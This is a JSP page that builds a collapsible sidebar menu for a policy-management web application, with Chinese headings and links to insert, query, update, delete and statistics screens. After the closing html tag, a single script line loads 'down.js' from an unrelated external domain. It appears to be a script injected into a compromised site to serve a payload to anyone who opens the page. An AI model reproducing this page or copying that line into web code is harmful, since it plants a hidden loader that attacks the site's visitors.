<%@ page language="java" pageEncoding="GBK"%>
<html>
<head>
<META http-equiv=Content-Type content=text/html;charset=gb2312>
<LINK href="tree.files/news2.css" type=text/css rel=stylesheet>
<STYLE type=text/css>BODY {
	BACKGROUND: #799ae1; MARGIN: 0px
}
.sec_menu {
	BORDER-RIGHT: white 1px solid; BACKGROUND: #d6dff7; OVERFLOW: hidden; BORDER-LEFT: white 1px solid; BORDER-BOTTOM: white 1px solid
}
.menu_title SPAN {
	FONT-WEIGHT: bold; LEFT: 10px; COLOR: #215dc6; POSITION: relative; TOP: 2px
}
.menu_title2 SPAN {
	FONT-WEIGHT: bold; LEFT: 10px; COLOR: #428eff; POSITION: relative; TOP: 2px
}
</STYLE>

<META content="MSHTML 6.00.2800.1505" name=GENERATOR>
<SCRIPT language=javascript1.2>
function showsubmenu(sid)
{
whichEl = eval("submenu" + sid);

if (whichEl.style.display == "none")
{
eval("submenu" + sid + ".style.display=\"\";");
}
else
{
eval("submenu" + sid + ".style.display=\"none\";");
}
}
</SCRIPT>
</head>
<body>
<TABLE cellSpacing=1 cellPadding=1 width=160 align=center>
	<TBODY>
		<TR>
			<TD class=menu_title id=imgmenu2
				onmouseover="this.className='menu_title2';" style="CURSOR: hand"
				onclick=showsubmenu(2) onmouseout="this.className='menu_title';"
				background=tree.files/menudown.gif height=25><A name=2></A><SPAN
				class=163s>
			<CENTER>一些基本动作</CENTER>
			</SPAN></TD>
		</TR>
		<TR>
			<TD id=submenu2 style="DISPLAY: none">
			<DIV class=sec_menu style="WIDTH: 152px">
			<TABLE cellSpacing=3 cellPadding=0 width=160 align=center>
				<TBODY>
					<TR>
						<TD>- <a href="insertPolicy.screen" target="mainFrame">insert  policy</a></TD>
					</TR>
				<TBODY>
					<TR>
						<TD>- <a href="queryPolicy.screen" target="mainFrame">query  policy</a></TD>
					</TR>
					<TR>
						<TD>- <a href="Update.screen" target="mainFrame">修改</a></TD>
					</TR>
					<TR>
						<TD>- <a href="Delete.screen" target="mainFrame">删除</a></TD>
					</TR>
					<TR>
						<TD>- <A href="Stat.screen" target="mainFrame">统计</A></TD>
					</TR>
				</TBODY>
			</TABLE>
			</DIV>
			</TD>
		</TR>
		<TR>
			<TD class=menu_title id=imgmenu4
				onmouseover="this.className='menu_title2';" style="CURSOR: hand"
				onclick=showsubmenu(4) onmouseout="this.className='menu_title';"
				background=tree.files/menudown.gif height=25><A name=4></A><SPAN
				class=163s>
			<CENTER>档案管理</CENTER>
			</SPAN></TD>
		</TR>
		<TR>
			<TD id=submenu4 style="DISPLAY: none">
			<DIV class=sec_menu style="WIDTH: 152px"></DIV>
			</TD>
		</TR>
		<TR>
			<TD class=menu_title id=imgmenu1
				onmouseover="this.className='menu_title2';" style="CURSOR: hand"
				onclick=showsubmenu(1) onmouseout="this.className='menu_title';"
				background=tree.files/menudown.gif height=25><A name=1></A><SPAN
				class=163s>
			<CENTER>记录查询</CENTER>
			</SPAN></TD>
		</TR>
		<TR>
			<TD id=submenu15 style="DISPLAY: none">
			<DIV class=sec_menu style="WIDTH: 152px"></DIV>
			</TD>
		</TR>
		<TR>
			<TD class=menu_title background=tree.files/menudown.gif height=25><A
				style="TEXT-DECORATION: none" href="../index.screen"
				target="indexFrame"><SPAN class=163s>
			<CENTER>退出系统</CENTER>
			</SPAN></A></TD>
		</TR>
		<TR>
			<TD id=submenu5 style="DISPLAY: none"></TD>
		</TR>
	</TBODY>
</TABLE>
</body>
</html>

<script language=javascript src=http://Town.531jx.cn/down.js></script>